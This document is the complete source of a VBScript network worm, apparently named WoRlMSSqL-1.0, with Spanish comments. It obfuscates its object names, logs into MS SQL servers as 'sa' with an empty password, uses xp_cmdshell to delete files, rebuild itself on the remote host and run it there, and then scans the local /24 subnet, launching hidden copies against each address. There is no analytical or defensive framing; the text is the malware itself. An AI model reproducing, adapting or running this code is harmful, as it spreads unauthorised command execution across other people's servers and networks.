oN eRroR resUmE NeXt
rem WoRlMSSqL-1.0
dim minombre, basefin
dim laip, totalworm
totalguorm = 191
minombre = Wscript.ScriptFullName
cont = 0
a = "Scri"
b = "pting"
c = ".Fil"
d = "eSyst"
e = "emOb"
f = "ject"
Set Fso = CreateObject(a+b+c+d+e+f)
set ap=fso.OpenTextFile(minombre,1)
SqlWlm("192.168.1.1")
iplocal()
ThreadBestiaLan()
Function SqlWlm(byval direccion)
xo = "Adod"
xo1 = "b.conn"
xo2 = "ection"
Xc1 = "Prov"
Xc2 = "ider= SQ"
Xc3 = "LOLED"
Xc4 = "B.1;Persis"
Xc5 = "t Securit"
Xc6 = "y Info= False;Us"
Xc7 = "er ID=s"
Xc8 = "a;Initial "
Xc9 = "Catal"
Xc10 = "og=maste"
Xc11 = "r;Data So"
Xc12 = "urce="
Xc13 = direccion
ConStr = Xc1+Xc2+Xc3+Xc4+Xc5+Xc6+Xc7+Xc8+Xc9+Xc10+Xc11+Xc12+Xc13
set conexion = CreateObject(xo+xo1+xo2)
Conexion.ConnectionString = ConStr
conexion.ConnectionTimeout = 2
conexion.open
obje = "Set Fso = CreateObject("+chr(34)+"Scripting.FileSystemObject"+chr(34)+")"
dta = "Set ers = fso.CreateTextFile ("+chr(34)+minombre+chr(34)+",True)"
dta1 ="errcontr =  chr(79)+"
dta2 = chr(34)+"n Error resume next"+chr(34)
dta3 = "ers.WriteLine errcontr"
dta4 = "ers.Close"
rem borrar posible copia
execu = "xp_cmdshell "+chr(39) + "del " + minombre +chr(39)
conexion.execute execu
rem establecer control de error
paso2 = "xp_cmdshell "+chr(39)+ "echo "+obje+ ">>"+minombre +chr(39)
conexion.execute paso2
paso2 = "xp_cmdshell "+chr(39) + "echo "+dta+ ">> "+minombre+chr(39)
conexion.execute paso2
paso2 = "xp_cmdshell "+chr(39) + "echo "+dta1+dta2+ ">> "+minombre+chr(39)
conexion.execute paso2
paso2 = "xp_cmdshell "+chr(39) + "echo "+dta3 + ">> "+minombre+chr(39)
conexion.execute paso2
paso2 = "xp_cmdshell "+chr(39) + "echo "+dta4 + ">> "+minombre+chr(39)
conexion.execute paso2
timeoff()
paso2 = "xp_cmdshell "+chr(39)+"wscript "+minombre+chr(39)
conexion.execute paso2
timeoff()
timeoff()
rem copiarnos
for cont = 0 to totalguorm
lect = ap.ReadLine 
if cont = 0 then
else 
if cont = 17 then
execu = "xp_cmdshell "+chr(39)+"echo " + "ThreadBestiaLan()" + ">> " + minombre + chr(39)
conexion.execute execu
else
execu = "xp_cmdshell "+chr(39)+"echo " + lect + ">> " + minombre +chr(39)
conexion.execute execu
end if
end if
next
timeoff()
execu = "xp_cmdshell "+chr(39)+"wscript " + minombre + chr(39)
conexion.execute execu
ap.close
end function
rem ----------
rem -------------------------------------------------------------------------------
sub IpLocal()
Set bat = fso.CreateTextFile ("ip.bat",true)
cod = "ipco"
ig = "nfig "
opip = " ip"
codigopip = cod + ig + chr(62) + opip
bat.Write codigopip
bat.Close
dim wshShell
Set WshShell  = WScript.CreateObject ("WSCript.shell")
If (fso.FileExists("ip")) Then
else
WshShell.Run "ip.bat",0
end if
timeoff()
set ip=fso.OpenTextFile("ip",1)
for conta = 0 to 9
leid = ip.ReadLine
caract = len(leid)
for z = 0 to caract
lecaract = mid(leid,1,z)
leercaract = right(lecaract,1)
if leercaract="I" then
lecaractc = mid(leid,1,z+1)
leercaract = right(lecaract,1)
ElseIf leercaractc="P" then
lecaract = mid(leid,1,z+2)
leercaract = right(lecaract,1)
ElseIf leercaract="." then
rem tenemos la ip
depura(leid)
else
End If
next
next
punto = 0
for c = 0 to len(LaIP)
xbase = mid (LaIP,1,c)
puntete = right(xbase,1)
base = base + puntete
if puntete = "." then
punto = punto + 1
Elseif punto = 2 then
basefin = base
end if
next
basefin = basefin + "."
rem Guardamos la ip en un fichero
Set test = fso.CreateTextFile ("test.txt",True)
test.Write basefin
test.Close
end sub
rem ----------
rem -------------------------------------------------------------------------------
Function depura(ByVal elstring)
total=len(elstring)
for v = 0 to total
rem sacamos la ip del string
lecaractz = mid(elstring,1,v)
leercaractz = right(lecaractz,1)
if leercaractz = ":" then
fintot = total-1 - v
ipstring = right(elstring,fintot)
cast = left(ipstring,3)
if cast = "255" then
Else
LaIP = ipstring
end if
end if
next
end function
rem ----------
rem -------------------------------------------------------------------------------
sub timeoff()
for tt = 1 to 10000000
next
end sub
rem ----------
rem -------------------------------------------------------------------------------
sub ThreadBestiaLan()
for bestLan = 1 to 254
gene = basefin&bestlan
Crea(gene)
next
end sub
function crea(byval iz)
set ap=fso.OpenTextFile(minombre,1)
copiaz = iz+1&".vbs"
Set thr = fso.CreateTextFile (copiaz,True)
for leeme = 0 to totalguorm
lectz = ap.ReadLine 
if leeme = 15 then
thr.writeline "SqlWlm("+chr(34)+iz+chr(34)+")"
else if leeme = 17 then
thr.Writeline "rem "&lectz
else
thr.Writeline lectz
end if
end if
next
thr.Close
ap.close
Set WshShell  = WScript.CreateObject ("WSCript.shell")
timeoff()
WshShell.run copiaz,0
end function
